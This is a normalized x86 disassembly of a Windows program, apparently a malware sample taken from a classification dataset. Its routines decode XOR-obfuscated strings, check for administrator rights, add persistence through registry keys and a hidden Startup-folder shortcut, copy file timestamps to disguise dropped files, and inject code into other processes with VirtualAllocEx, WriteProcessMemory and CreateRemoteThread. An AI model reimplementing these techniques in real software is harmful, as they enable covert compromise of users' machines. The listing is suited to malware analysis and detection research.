push ebx
mov ebx [ esp + 0x14 ]
push esi
push ebx
call [ lstrcpyA@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffe
test ecx ecx
jle r-xdata
pop edi
pop esi
retn
pop ebx
pop edi
mov eax 0x1
pop esi
retn
cmp [ ecx + ebx ] 0x5c
je r-xdata
mov [ ecx + ebx ] 0x0
dec ecx
test ecx ecx
jg r-xdata
pop ebx
pop edi
mov eax 0x1
pop esi
retn
sub_40e730
mov edx [ esp + 0x4 ]
sub esp 0x250
test edx edx
push ebx
push ebp
push esi
push edi
je r-xdata
lea ecx [ esp + 0x58 ]
push 0x104
push ecx
call [ GetWindowsDirectoryA@IAT ]
lea edx [ esp + 0x15c ]
push rw-data
push edx
call sub_40e8d0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x58 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x58 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x15c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x250
retn
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
push ecx
lea eax [ esp + 0x24 ]
push edx
push eax
push esi
call [ GetFileTime@IAT ]
mov ebx [ CloseHandle@IAT ]
mov ebp [ Sleep@IAT ]
test eax eax
je r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea ebx [ esp + 0x58 ]
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
jmp r-xdata
push esi
call ebx
push 0x64
call ebp
push esi
call ebx
mov ecx [ esp + 0x268 ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x40000000
push ecx
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
push 0x0
push 0x80
and ecx 0x3
push 0x3
push 0x0
push 0x1
[ edi ] [ esi ]
mov edi [ CreateFileA@IAT ]
lea eax [ esp + 0x6c ]
push 0x80000000
push eax
call edi
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov edi [ FileTimeToSystemTime@IAT ]
lea edx [ esp + 0x28 ]
lea eax [ esp + 0x20 ]
push edx
push eax
call edi
lea ecx [ esp + 0x48 ]
lea edx [ esp + 0x18 ]
push ecx
push edx
call edi
lea eax [ esp + 0x38 ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
call edi
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x24 ]
push eax
push ecx
push esi
call [ SetFileTime@IAT ]
test eax eax
je r-xdata
push esi
call [ FlushFileBuffers@IAT ]
push 0x64
call ebp
sub_40e8d0
sub esp 0x84
mov edx [ esp + 0x8c ]
push ebx
push ebp
push esi
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov [ esp + 0x10 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea ebx [ esp + 0x14 ]
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
xor edi edi
test ebp ebp
jle r-xdata
mov edx [ esp + 0x98 ]
mov [ edi + edx ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
mov ebx [ esp + 0x98 ]
mov esi edx
sub ebx edx
mov [ ebx + esi ] cl
inc edi
inc esi
cmp edi ebp
jl r-xdata
xor cl dl
mov eax edi
mov cl [ esi ]
cdq
idiv [ esp + 0x10 ]
mov dl [ esp + edx + 0x14 ]
cmp cl dl
je r-xdata
mov ecx [ esp + 0x98 ]
mov [ edi + ecx ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
sub_40e980
sub esp 0x80
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push esi
push edi
mov edi rw-data
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebx ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x98 ]
xor ecx ecx
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
add esp 0x80
retn
mov eax [ esp + 0x90 ]
push ebp
mov ebp [ esp + 0x98 ]
sub ebp eax
mov edx [ esp + 0x94 ]
mov eax ecx
lea esi [ ecx + edx ]
cdq
idiv ebx
mov al [ esp + edx + 0x10 ]
mov dl [ esi + ebp ]
xor al dl
inc ecx
cmp ecx edi
mov [ esi ] al
jl r-xdata
pop ebp
sub_40ea10
sub esp 0x10
push ebx
xor ebx ebx
mov [ esp + 0xc ] bl
mov [ esp + 0xd ] bl
mov [ esp + 0xe ] bl
mov [ esp + 0xf ] bl
mov [ esp + 0x10 ] bl
mov [ esp + 0x11 ] 0x5
call sub_40ea90
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
push ecx
call [ AllocateAndInitializeSid@IAT ]
cmp eax ebx
mov [ esp + 0x4 ] eax
je r-xdata
pop ebx
add esp 0x10
retn
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ebx
call CheckTokenMembership
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ FreeSid@IAT ]
mov eax [ esp + 0x4 ]
mov [ esp + 0x4 ] ebx
sub_40ea90
sub esp 0x9c
push esi
mov esi [ GetVersionExA@IAT ]
push edi
mov ecx 0x27
xor eax eax
lea edi [ esp + 0x8 ]
[ edi ]
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x9c
push eax
call esi
test eax eax
jne r-xdata
cmp [ esp + 0x18 ] 0x2
jne r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x94
push ecx
call esi
test eax eax
je r-xdata
xor eax eax
cmp [ esp + 0xc ] 0x5
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax 0x1
cmp ecx eax
je r-xdata
pop edi
pop esi
add esp 0x9c
retn
sub_40eb00
push ecx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
lea eax [ esp + 0xc ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x8 ]
push esi
mov [ esp + 0xc ] eax
push ecx
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x8 ]
push edx
mov edx [ esp + 0x18 ]
push eax
push 0x0
push ecx
push edx
mov [ esp + 0x1c ] 0x1
call [ RegQueryValueExA@IAT ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ecx
retn
xor eax eax
pop ecx
retn
sub_40eb70
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push 0xf003f
push 0x0
push esi
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ esp + 0x14 ]
push edx
push 0x1
push eax
mov eax [ esp + 0x24 ]
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0x10 ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
test esi esi
sete al
pop esi
retn
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x0
push 0xf003f
push 0x0
push rw-data
push 0x0
push esi
push edi
mov [ esp + 0x30 ] 0x1
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_40ec10
push esi
mov esi [ esp + 0xc ]
lea eax [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push 0xf003f
push 0x0
push esi
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x18 ]
push 0x4
push eax
push 0x4
push 0x0
push ecx
push edx
call [ RegSetValueExA@IAT ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
pop edi
test esi esi
sete al
pop esi
retn
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push 0x0
push 0xf003f
push 0x0
push rw-data
push 0x0
push esi
push edi
mov [ esp + 0x30 ] 0x1
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_40eca0
sub esp 0x108
push ebx
mov ebx [ esp + 0x114 ]
push ebp
push esi
test ebx ebx
jne r-xdata
push ebx
call [ lstrlenA@IAT ]
test eax eax
jg r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn
mov ebp [ esp + 0x118 ]
lea eax [ esp + 0xc ]
push eax
push 0x10008
push 0x0
push ebx
push ebp
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn
mov eax [ esp + 0xc ]
mov esi [ RegEnumKeyExA@IAT ]
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x1c ]
push 0x0
lea edx [ esp + 0x24 ]
push ecx
push edx
push 0x0
push eax
mov [ esp + 0x30 ] 0x100
call esi
test eax eax
jne r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn
mov ecx [ esp + 0xc ]
push ecx
call [ RegCloseKey@IAT ]
push ebx
push ebp
call [ RegDeleteKeyA@IAT ]
neg eax
sbb eax eax
pop esi
pop ebp
inc eax
pop ebx
add esp 0x108
retn
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
call sub_40eca0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push eax
call [ RegCloseKey@IAT ]
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x108
retn
mov edx [ esp + 0xc ]
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x24 ]
push eax
push ecx
push 0x0
push edx
mov [ esp + 0x30 ] 0x100
call esi
test eax eax
je r-xdata
sub_40edb0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push eax
push 0xf003f
push 0x0
push ecx
push edx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push esi
push eax
push ecx
call [ RegDeleteValueA@IAT ]
mov edx [ esp + 0xc ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
retn
mov eax 0x1
retn
sub_40ee00
sub esp 0x18
push esi
call sub_40ef00
test eax eax
jge r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0x4 ] edx
mov [ esp + 0x18 ] eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x4 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esi ]
lea eax [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x10 ] ecx
call sub_40efb0
add esp 0x8
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
add esp 0x18
retn
call sub_40ef60
mov ecx [ esp + 0xc ]
xor eax eax
mov [ esi ] ecx
pop esi
add esp 0x18
retn
call sub_40ef60
or eax 0xffffffff
pop esi
add esp 0x18
retn
sub_40ee80
sub esp 0x18
push esi
call sub_40ef00
test eax eax
jge r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0x4 ] edx
mov [ esp + 0x18 ] eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x4 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esi ]
lea eax [ esp + 0x10 ]
push edx
push eax
mov [ esp + 0x10 ] ecx
call sub_40f110
add esp 0x8
test eax eax
jge r-xdata
or eax 0xffffffff
pop esi
add esp 0x18
retn
call sub_40ef60
mov ecx [ esp + 0xc ]
xor eax eax
mov [ esi ] ecx
pop esi
add esp 0x18
retn
call sub_40ef60
or eax 0xffffffff
pop esi
add esp 0x18
retn
sub_40ef00
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x4e74
call sub_406c98
push 0x4e74
mov [ rw-data ] eax
call sub_406c98
push 0x139d
mov [ rw-data ] eax
call sub_406c98
mov ecx [ rw-data ]
add esp 0xc
test ecx ecx
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
or eax 0xffffffff
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
xor eax eax
retn
sub_40ef60
mov eax [ rw-data ]
push eax
call sub_406c50
mov ecx [ rw-data ]
push ecx
call sub_406c50
mov edx [ rw-data ]
push edx
call sub_406c50
xor eax eax
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_40efb0
mov eax [ rw-data ]
test eax eax
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi 0x100
xor eax eax
call sub_40ef00
mov ecx [ rw-data ]
add eax 0x4
cmp eax 0x4e74
mov [ eax + ecx - 0x4 ] 0xffffffff
jl r-xdata
mov ebp [ esp + 0x14 ]
push ebp
call sub_40f260
push ebp
mov esi eax
call sub_40f260
mov ebx eax
add esp 0x8
cmp ebx 0xffffffff
je r-xdata
push esi
mov esi [ esp + 0x1c ]
push esi
call sub_40f330
push 0xfff
push esi
call sub_40f330
push 0x0
push esi
call sub_40f330
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push esi
call sub_40f090
mov edx [ rw-data ]
add esp 0x8
mov ecx [ edx + eax * 4 ]
cmp ecx 0xffffffff
je r-xdata
cmp edi 0xffe
ja r-xdata
mov esi ecx
jmp r-xdata
mov edx [ esp + 0x18 ]
push esi
push edx
call sub_40f330
add esp 0x8
test eax eax
jl r-xdata
mov [ edx + eax * 4 ] edi
mov edx [ rw-data ]
inc edi
mov [ edx + eax * 4 ] esi
mov ecx [ rw-data ]
mov [ ecx + eax ] bl
push ebp
call sub_40f260
mov ebx eax
add esp 0x4
cmp ebx 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov esi ebx
sub_40f090
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push ebx
push ebp
shl eax 0x4
push esi
xor eax ecx
push edi
jne r-xdata
mov ebp 0x139d
sub ebp eax
mov ebp 0x1
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esp + 0x14 ]
mov ebx [ esi ]
cmp ebx edx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea edi [ ebp * 4 ]
lea esi [ ecx + eax * 4 ]
lea ecx [ edx + eax * 4 ]
sub eax ebp
sub ecx edi
sub esi edi
test eax eax
jge r-xdata
mov ebx [ rw-data ]
xor edx edx
mov dl [ ebx + eax ]
mov ebx [ esp + 0x18 ]
cmp edx ebx
je r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
add eax 0x139d
add ecx 0x4e74
add esi 0x4e74
jmp r-xdata
sub_40f110
push ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
mov [ esp + 0x14 ] 0x100
call sub_40f2c0
mov ebp eax
mov eax [ esp + 0x20 ]
push eax
push ebp
mov ebx ebp
call sub_40f290
push esi
call sub_40f2c0
mov edi eax
add esp 0x10
cmp edi 0xfff
je r-xdata
call sub_40ef00
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp edi [ esp + 0x10 ]
jb r-xdata
push edi
push rw-data
push ebp
mov [ rw-data ] bl
push rw-data
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0xffe
ja r-xdata
mov ecx [ esp + 0x1c ]
xor eax eax
mov al [ esi ]
push ecx
push eax
dec esi
call sub_40f290
add esp 0x8
test eax eax
jl r-xdata
call sub_40f200
mov esi eax
add esp 0x8
xor ebx ebx
cmp esi rw-data
mov bl [ esi ]
jb r-xdata
mov edx [ esp + 0x18 ]
mov ebp edi
push edx
call sub_40f2c0
mov edi eax
add esp 0x4
cmp edi 0xfff
jne r-xdata
mov edx [ rw-data ]
inc eax
mov [ esp + 0x10 ] eax
mov [ edx + eax * 4 - 0x4 ] ebp
mov ecx [ rw-data ]
mov [ ecx + eax - 0x1 ] bl
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
cmp esi rw-data
jae r-xdata
sub_40f200
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx 0xff
jbe r-xdata
mov [ eax ] cl
pop esi
retn
mov edx [ rw-data ]
inc eax
mov dl [ edx + ecx ]
mov [ eax - 0x1 ] dl
mov edx [ rw-data ]
mov ecx [ edx + ecx * 4 ]
mov edx esi
inc esi
cmp edx 0xffe
jge r-xdata
push rw-data
call sub_4121b0
add esp 0x4
push 0xfffffffd
call sub_408645
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
cmp ecx 0xff
ja r-xdata
sub_40f260
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp eax edx
jg r-xdata
mov eax [ ecx ]
push ebx
xor ebx ebx
mov bl [ edx + eax ]
inc edx
mov eax ebx
mov [ ecx + 0x8 ] edx
pop ebx
retn
or eax 0xffffffff
retn
sub_40f290
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
cmp edx ecx
jg r-xdata
mov edx [ eax ]
push ebx
mov bl [ esp + 0x8 ]
mov [ ecx + edx ] bl
mov ecx [ eax + 0x8 ]
inc ecx
pop ebx
mov [ eax + 0x8 ] ecx
xor eax eax
retn
or eax 0xffffffff
retn
sub_40f2c0
mov edx [ rw-data ]
cmp edx 0x18
jg r-xdata
mov ecx [ rw-data ]
sub edx 0xc
mov eax ecx
mov [ rw-data ] edx
shl ecx 0xc
shr eax 0x14
mov [ rw-data ] ecx
retn
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40f260
mov edx [ rw-data ]
mov ecx 0x18
sub ecx edx
add edx 0x8
shl eax cl
mov ecx [ rw-data ]
add esp 0x4
mov [ rw-data ] edx
or ecx eax
cmp edx 0x18
mov [ rw-data ] ecx
jle r-xdata
pop esi
sub_40f330
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx 0x14
push esi
mov esi [ esp + 0xc ]
sub ecx edx
shl esi cl
add edx 0xc
mov [ rw-data ] edx
or eax esi
cmp edx 0x8
mov [ rw-data ] eax
jl r-xdata
xor eax eax
pop esi
retn
mov esi [ esp + 0x8 ]
or eax 0xffffffff
pop esi
retn
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub ecx 0x8
shl eax 0x8
cmp ecx 0x8
mov [ rw-data ] eax
mov [ rw-data ] ecx
jge r-xdata
shr eax 0x18
push esi
push eax
call sub_40f290
add esp 0x8
test eax eax
jl r-xdata
sub_40f3a0
sub esp 0x390
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x88 ]
push esi
push edi
mov edi [ esp + 0x3a0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x8 ]
push ecx
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
pop edi
pop esi
add esp 0x390
retn
lea edx [ esp + 0x10 ]
push rw-data
push edx
call sub_40e8d0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x3a4 ]
add esp 0x8
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0x50 ]
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x3a4 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
lea eax [ esp + 0x190 ]
push 0x104
push eax
lea ecx [ esp + 0x98 ]
push 0xffffffff
push ecx
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0xc ]
lea ecx [ esp + 0x190 ]
push 0x1
push ecx
mov edx [ eax ]
push eax
call [ edx + 0x18 ]
mov esi eax
test esi esi
je r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x94 ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
pop ebx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
mov eax [ esp + 0xc ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
sub_40f4d0
sub esp 0x398
lea eax [ esp ]
push rw-data
push eax
call sub_40e8d0
add esp 0x8
push 0x0
call [ CoInitialize@IAT ]
push 0x0
lea ecx [ esp + 0x84 ]
push 0x7
push ecx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
mov eax [ esp + 0x39c ]
lea edx [ esp ]
push edx
lea ecx [ esp + 0x84 ]
push eax
push ecx
lea edx [ esp + 0x18c ]
push rw-data
push edx
call sub_406520
add esp 0x14
lea eax [ esp + 0x280 ]
lea ecx [ esp + 0x180 ]
push eax
push ecx
call sub_412926
neg eax
sbb eax eax
neg eax
add esp 0x398
retn
sub_40f550
sub esp 0x398
push 0x0
call [ CoInitialize@IAT ]
push 0x0
lea eax [ esp + 0x4 ]
push 0x7
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea ecx [ esp ]
push ecx
call [ GetFileAttributesA@IAT ]
or al 0x6
lea edx [ esp ]
push eax
push edx
call [ SetFileAttributesA@IAT ]
mov eax [ esp + 0x39c ]
lea ecx [ esp ]
push eax
push ecx
lea edx [ esp + 0x188 ]
push rw-data
push edx
call sub_406520
add esp 0x10
lea eax [ esp + 0x280 ]
lea ecx [ esp + 0x180 ]
push eax
push ecx
call sub_412926
test eax eax
jne r-xdata
mov eax 0x1
add esp 0x398
retn
lea edx [ esp + 0x100 ]
push rw-data
push edx
call sub_40e8d0
mov edx [ esp + 0x3a8 ]
lea eax [ esp + 0x108 ]
lea ecx [ esp + 0x188 ]
push eax
push ecx
push edx
call sub_40f3a0
add esp 0x14
test eax eax
jge r-xdata
xor eax eax
add esp 0x398
retn
sub_40f610
push ecx
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push eax
push 0x0
push 0x3a
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x40
push 0x1000
push 0x1000
push 0x0
push esi
call [ VirtualAllocEx@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push 0x1000
call sub_411b50
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
push edx
push edi
call sub_40f700
add esp 0xc
test eax eax
jg r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ edi + 0x4 ]
lea eax [ esp + 0x14 ]
push eax
lea edx [ edi + 0x8 ]
push ecx
push edx
push ebx
push esi
call [ WriteProcessMemory@IAT ]
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
lea eax [ esp + 0xc ]
push eax
push 0x0
push 0x0
push ebx
push 0x0
push 0x0
push esi
call [ CreateRemoteThread@IAT ]
push esi
mov ebx eax
call [ CloseHandle@IAT ]
push edi
call sub_411b6d
add esp 0x4
xor eax eax
test ebx ebx
pop edi
pop esi
setne al
pop ebx
pop ecx
retn
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
sub_40f700
mov eax [ esp + 0xc ]
push esi
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov esi [ esp + 0x8 ]
push eax
push ecx
push esi
call sub_411e1c
add esp 0xc
push 0x4
push esi
call sub_41203a
mov eax [ esi + 0x4 ]
add esp 0x8
pop esi
retn
mov eax [ esp + 0xc ]
mov esi [ esp + 0x8 ]
push eax
push esi
call sub_41209b
add esp 0x8
push 0x4
push esi
call sub_41203a
mov eax [ esi + 0x4 ]
add esp 0x8
pop esi
retn
sub_40f750
sub esp 0x200
lea eax [ esp ]
push ebx
push esi
push edi
push rw-data
push eax
call sub_40e8d0
mov edi [ esp + 0x218 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
push 0x100
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x118 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x1c ]
push rw-data
push ecx
push 0x80000002
call sub_40eb00
add esp 0x1c
pop edi
pop esi
pop ebx
add esp 0x200
retn
sub_40f7d0
sub esp 0x280
push ebx
push esi
push edi
mov edi [ esp + 0x294 ]
test edi edi
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x18c ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea eax [ esp + 0x18c ]
push 0xff
push eax
push edi
call [ GetModuleFileNameA@IAT ]
jmp r-xdata
xor eax eax
add esp 0x280
retn
lea edx [ esp + 0x100 ]
push rw-data
push edx
call sub_40e8d0
lea eax [ esp + 0x108 ]
lea ecx [ esp + 0x8 ]
push eax
push rw-data
push ecx
push 0x80000002
call sub_40eb70
push rw-data
lea edx [ esp + 0x1c ]
push rw-data
push edx
push 0x80000002
call sub_40eb70
push 0x1
lea eax [ esp + 0x2c ]
push rw-data
push eax
push 0x80000002
call sub_40ec10
push rw-data
lea ecx [ esp + 0x3c ]
push rw-data
push ecx
push 0x80000001
call sub_40eb70
add esp 0x48
mov eax 0x1
add esp 0x280
retn
lea ecx [ esp + 0xc ]
push rw-data
push ecx
call sub_40e8d0
mov edi [ esp + 0x298 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x194 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
push 0x80000002
call sub_40eb70
add esp 0x18
test eax eax
pop edi
pop esi
pop ebx
je r-xdata
sub_40f920
sub esp 0x100
lea eax [ esp ]
push ebx
push esi
push edi
push rw-data
push eax
call sub_40e8d0
mov edi [ esp + 0x118 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push 0x80000002
call sub_40eca0
lea ecx [ esp + 0x1c ]
push ecx
push 0x80000001
call sub_40eca0
add esp 0x18
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x100
retn
sub_40f9a0
sub esp 0x200
lea eax [ esp + 0x100 ]
push ebx
push esi
push edi
push rw-data
push eax
call sub_40e8d0
mov edi [ esp + 0x218 ]
or ecx 0xffffffff
